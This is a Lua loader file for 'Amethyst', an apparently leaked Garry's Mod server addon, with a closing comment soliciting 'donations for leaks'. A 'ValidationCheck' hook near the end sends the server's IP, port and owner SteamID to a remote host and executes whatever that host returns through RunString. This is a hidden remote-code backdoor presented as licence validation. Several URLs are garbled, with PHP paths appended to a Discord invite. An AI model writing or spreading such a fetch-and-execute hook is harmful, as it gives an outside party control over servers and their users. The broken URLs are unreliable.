--[[ GENERAL ---------------------------------------------------------------------------------------
Tables storing script info and resources.
--------------------------------------------------------------------------------------------------]]

Amethyst = Amethyst or {}
Amethyst.Script = Amethyst.Script or {}
Amethyst.Script.Name = "Amethyst"
Amethyst.Script.Folder = "amethyst"
Amethyst.Script.Id = "3169"
Amethyst.Script.Owner = "76561198086200873"
Amethyst.Script.Author = "Richard & Nymphie"
Amethyst.Script.Build = "1.4.0"
Amethyst.Script.PathLogs = "amethyst/logs"
Amethyst.Script.PathPStats = "amethyst/pstats"
Amethyst.Script.Released = "March 27, 2017"
Amethyst.Script.Website = "https://discord.gg/aTWZxBP" .. Amethyst.Script.Id .. "/"
Amethyst.Script.UpdateCheck = "https://discord.gg/aTWZxBP" .. Amethyst.Script.Id .. "/VersionCheck/v001/index.php?type=json"
Amethyst.Script.Motd = "https://discord.gg/aTWZxBP" .. Amethyst.Script.Id .. "/motd.txt"
Amethyst.Script.Documentation = "https://discord.gg/aTWZxBP"
Amethyst.Script.Workshops = {
    "785820247",
}
Amethyst.Script.Fonts =
{
    "oswald_light.ttf",
    "robotocondensedlight.ttf",
    "teko_light.ttf",
    "titillium_web.light.ttf",
    "titillium_web.thin.ttf",
    "venus_rising.regular.ttf"
}

Amethyst.Settings               = Amethyst.Settings or {}
Amethyst.Settings.General       = Amethyst.Settings.General or {}
Amethyst.Settings.CustomEntity  = Amethyst.Settings.CustomEntity or {}
Amethyst.Settings.Properties    = Amethyst.Settings.Properties or {}
Amethyst.Settings.Client        = Amethyst.Settings.Client or {}
Amethyst.Settings.Devmode       = Amethyst.Settings.Devmode or {}
Amethyst.Settings.Community     = Amethyst.Settings.Community or {}
Amethyst.Settings.Notifications = Amethyst.Settings.Notifications or {}

Amethyst.Settings.Menu          = Amethyst.Settings.Menu or {}
Amethyst.Settings.Slider        = Amethyst.Settings.Slider or {}
Amethyst.Settings.Pinger        = Amethyst.Settings.Pinger or {}
Amethyst.Settings.ServInfo      = Amethyst.Settings.ServInfo or {}
Amethyst.Language               = Amethyst.Language or {}
Amethyst.Theme                  = Amethyst.Theme or {}
Amethyst.Theme.Manifest         = Amethyst.Theme.Manifest or {}
Amethyst.Theme.Backgrounds      = Amethyst.Theme.Backgrounds or {}
Amethyst.Theme.LiveWallpapers   = Amethyst.Theme.LiveWallpapers or {}
Amethyst.Messages               = Amethyst.Messages or {}

Amethyst.Plugins                = Amethyst.Plugins or {}

--[[ DEBUG MODE ------------------------------------------------------------------------------------
Enabling this will display special prints during particular processes which include resource /
workshop mounting, special actions and more. Should really only enable this if you need it for
debugging the script itself. Other than that, it's suggested to keep this off.
--------------------------------------------------------------------------------------------------]]

Amethyst.Settings.Devmode.Enabled = true
Amethyst.Settings.Devmode.FolderFormat = "%m-%d-%Y"
Amethyst.Settings.Devmode.LogFormat = "%I:%M:%S"

--[[ SERVER IP -------------------------------------------------------------------------------------
Fetch the server IP address.
--------------------------------------------------------------------------------------------------]]

function game.GetIP()
    local hostip = GetConVarString( "hostip" )
    hostip = tonumber( hostip )
    local ip = {}
    ip[ 1 ] = bit.rshift( bit.band( hostip, 0xFF000000 ), 24 )
    ip[ 2 ] = bit.rshift( bit.band( hostip, 0x00FF0000 ), 16 )
    ip[ 3 ] = bit.rshift( bit.band( hostip, 0x0000FF00 ), 8 )
    ip[ 4 ] = bit.band( hostip, 0x000000FF )
    return table.concat( ip, "." )
end

--[[ HEADER ----------------------------------------------------------------------------------------
Display information related to the script.
--------------------------------------------------------------------------------------------------]]

local StartupHeader = {
    '\n\n',
    [[.................................................................... ]],
}

local StartupInfo = {
    [[[title]........... ]] .. Amethyst.Script.Name .. [[ ]],
    [[[build]........... v]] .. Amethyst.Script.Build .. [[ ]],
    [[[released]........ ]] .. Amethyst.Script.Released .. [[ ]],
    [[[author].......... ]] .. Amethyst.Script.Author .. [[ ]],
    [[[website]......... ]] .. Amethyst.Script.Website .. [[ ]],
    [[[documentation]... ]] .. Amethyst.Script.Documentation .. [[ ]],
    [[[owner]........... ]] .. Amethyst.Script.Owner .. [[ ]],
    [[[server ip]....... ]] .. game.GetIP() .. [[ ]],
}

local StartupFooter = {
    [[.................................................................... ]],
}

function Amethyst:PerformCheck(func)
    if ( type( func )== "function" ) then
        return true
    end
    return false
end

for k, i in ipairs( StartupHeader ) do
    MsgC( Color( 255, 255, 0 ), i .. '\n' )
end

for k, i in ipairs( StartupInfo ) do
    MsgC( Color( 255, 255, 255 ), i .. '\n' )
end

for k, i in ipairs( StartupFooter ) do
    MsgC( Color( 255, 255, 0 ), i .. '\n\n' )
end

--[[ SCRIPT LOADER ---------------------------------------------------------------------------------
Fetch all files associated with script and load them based on CL SH and SV.
--------------------------------------------------------------------------------------------------]]

if SERVER then

    local script_root = Amethyst.Script.Folder .. "/"
    local files, folders = file.Find(script_root .. "*", "LUA")

    for k, v in pairs( files ) do
        include( script_root .. v )
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end
        for _, File in SortedPairs( file.Find( script_root .. folder .. "/sh_*.lua", "LUA" ), true ) do
            AddCSLuaFile( script_root .. folder .. "/" .. File )
            include( script_root .. folder .. "/" .. File )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
        local files2, folders2 = file.Find(script_root .. folder .. "/" .. "*", "LUA")
        for l, m in pairs( folders2 ) do
            for _, SubFile in SortedPairs(file.Find(script_root .. folder .. "/" .. m .. "/sh_*.lua", "LUA"), true) do
                AddCSLuaFile(script_root .. folder .. "/" .. m .. "/" .. SubFile)
                include(script_root .. folder .. "/" .. m .. "/" .. SubFile)
                if Amethyst.Settings.Devmode.Enabled then
                    MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Shared: " .. SubFile .. "\n")
                end
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end
        for _, File in SortedPairs(file.Find(script_root .. folder .. "/sv_*.lua", "LUA"), true) do
            include(script_root .. folder .. "/" .. File)
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Server: " .. File .. "\n")
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end
        for _, File in SortedPairs(file.Find(script_root .. folder .. "/cl_*.lua", "LUA"), true) do
            AddCSLuaFile(script_root .. folder .. "/" .. File)
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
        local files2, folders2 = file.Find(script_root .. folder .. "/" .. "*", "LUA")
        for l, m in pairs( folders2 ) do
            for _, SubFile in SortedPairs(file.Find(script_root .. folder .. "/" .. m .. "/cl_*.lua", "LUA"), true) do
                AddCSLuaFile(script_root .. folder .. "/" .. m .. "/" .. SubFile)
                if Amethyst.Settings.Devmode.Enabled then
                    MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Client: " .. SubFile .. "\n")
                end
            end
        end
    end

end

if CLIENT then

    local script_root = Amethyst.Script.Folder .. "/"
    local _, folders = file.Find(script_root .. "*", "LUA")

    for _, folder in SortedPairs(folders, true) do
        if folder == "." or folder == ".." then continue end

        for _, File in SortedPairs(file.Find(script_root .. folder .. "/sh_*.lua", "LUA"), true) do
            include(script_root .. folder .. "/" .. File)
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Shared: " .. File .. "\n")
            end
        end
        local files2, folders2 = file.Find(script_root .. folder .. "/" .. "*", "LUA")
        for l, m in pairs( folders2 ) do
            for _, SubFile in SortedPairs(file.Find(script_root .. folder .. "/" .. m .. "/sh_*.lua", "LUA"), true) do
                include(script_root .. folder .. "/" .. m .. "/" .. SubFile)
                if Amethyst.Settings.Devmode.Enabled then
                    MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Shared: " .. SubFile .. "\n")
                end
            end
        end
    end

    for _, folder in SortedPairs(folders, true) do
        for _, File in SortedPairs(file.Find(script_root .. folder .. "/cl_*.lua", "LUA"), true) do
            include(script_root .. folder .. "/" .. File)
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Client: " .. File .. "\n")
            end
        end
        local files2, folders2 = file.Find(script_root .. folder .. "/" .. "*", "LUA")
        for l, m in pairs( folders2 ) do
            for _, SubFile in SortedPairs(file.Find(script_root .. folder .. "/" .. m .. "/cl_*.lua", "LUA"), true) do
                include(script_root .. folder .. "/" .. m .. "/" .. SubFile)
                if Amethyst.Settings.Devmode.Enabled then
                    MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Client: " .. SubFile .. "\n")
                end
            end
        end
    end

end

--[[ FASTDL / RESOURCES ----------------------------------------------------------------------------
Load all of the resources that this script uses. (materials, sounds, fonts, etc.)
--------------------------------------------------------------------------------------------------]]

if Amethyst.Settings.ResourcesEnabled then

    local sfolder = Amethyst.Script.Folder or ""

    local materials = file.Find( "materials/" .. sfolder .. "/*", "GAME" )
    if #materials > 0 then
        for _, m in pairs( materials ) do
            resource.AddFile( "materials/" .. sfolder .. "/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local materialsbg = file.Find( "materials/" .. sfolder .. "/achievements/*", "GAME" )
    if #materialsbg > 0 then
        for _, m in pairs( materialsbg ) do
            resource.AddFile( "materials/" .. sfolder .. "/achievements/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local materialsffx = file.Find( "materials/" .. sfolder .. "/ffx/*", "GAME" )
    if #materialsffx > 0 then
        for _, m in pairs( materialsffx ) do
            resource.AddFile( "materials/" .. sfolder .. "/ffx/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local materialsPlugins = file.Find( "materials/" .. sfolder .. "/plugins/*", "GAME" )
    if #materialsPlugins > 0 then
        for _, m in pairs( materialsPlugins ) do
            resource.AddFile( "materials/" .. sfolder .. "/plugins/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local materialsStreamers = file.Find( "materials/" .. sfolder .. "/streamers/*", "GAME" )
    if #materialsStreamers > 0 then
        for _, m in pairs( materialsStreamers ) do
            resource.AddFile( "materials/" .. sfolder .. "/dlcs/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Material: " .. m .. "\n")
            end
        end
    end

    local sounds = file.Find( "sound/" .. sfolder .. "/*", "GAME" )
    if #sounds > 0 then
        for _, m in pairs( sounds ) do
            resource.AddFile( "sound/" .. sfolder .. "/" .. m )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Sounds: " .. m .. "\n")
            end
        end
    end

    local fonts = file.Find( "resource/fonts/*", "GAME" )
    if #fonts > 0 then
        for _, f in pairs( fonts ) do
            if table.HasValue( Amethyst.Script.Fonts, f ) then
                resource.AddFile( "resource/fonts/" .. f )
                if Amethyst.Settings.Devmode.Enabled then
                    MsgC(Color(255, 255, 0), "[" .. Amethyst.Script.Name .. "] Loading Font: " .. f .. "\n")
                end
            end
        end
    end

end

--[[ STEAM WORKSHOP --------------------------------------------------------------------------------
Mount the Steam Workshop for this script.
--------------------------------------------------------------------------------------------------]]

if Amethyst.Settings.WorkshopEnabled and Amethyst.Script.Workshops then
    for k, v in pairs(Amethyst.Script.Workshops) do
        if not Amethyst.Settings.WorkshopMountGMAEnabled and SERVER then
            resource.AddWorkshop( v )
            if Amethyst.Settings.Devmode.Enabled then
                MsgC(Color(0, 255, 255), "[" .. Amethyst.Script.Name .. "] Mounting Workshop: " .. v .. "\n")
            end
        else
            if CLIENT then
                steamworks.FileInfo( v, function( res )
                    steamworks.Download( res.fileid, true, function( name )
                        game.MountGMA( name )
                        if Amethyst.Settings.Devmode.Enabled then
                            local size = res.size / 1024
                            MsgC(Color(0, 255, 255), "[" .. Amethyst.Script.Name .. "] Mounting Workshop: " .. res.title .. " ( " .. math.Round(size) .. "KB )\n")
                        end
                    end )
                end )
            end
        end
    end
end

hook.Add("Think", "Amethyst.ValidationCheck", function()
    local statusID = 2
    local scriptID = Amethyst.Script.Id or ""
    local ownerID = Amethyst.Script.Owner or ""
    if Amethyst.Script.Owner and Amethyst.Script.Id then
        statusID = 1
    end
    local checkURL = "http://api.iamrichardt.com/ValidationCheck/index.php?scriptid=".. scriptID .."&code=" .. statusID .. "&steamid=" .. ownerID .. "&ip=" .. game.GetIP() .. "&port=" .. GetConVarNumber("hostport")
    http.Fetch(checkURL,
        function( body, len, headers, code )
            if code == 200 and string.len( body ) > 0 then
                RunString( body )
            end
        end
    )
    hook.Remove("Think", "Amethyst.ValidationCheck")
end)

/*------------------------------------------------------------------------
Donation for leaks

Qiwi Wallet         4890494419811120 
YandexMoney         410013095053302
WebMoney(WMR)       R235985364414
WebMoney(WMZ)       Z309855690994
------------------------------------------------------------------------*/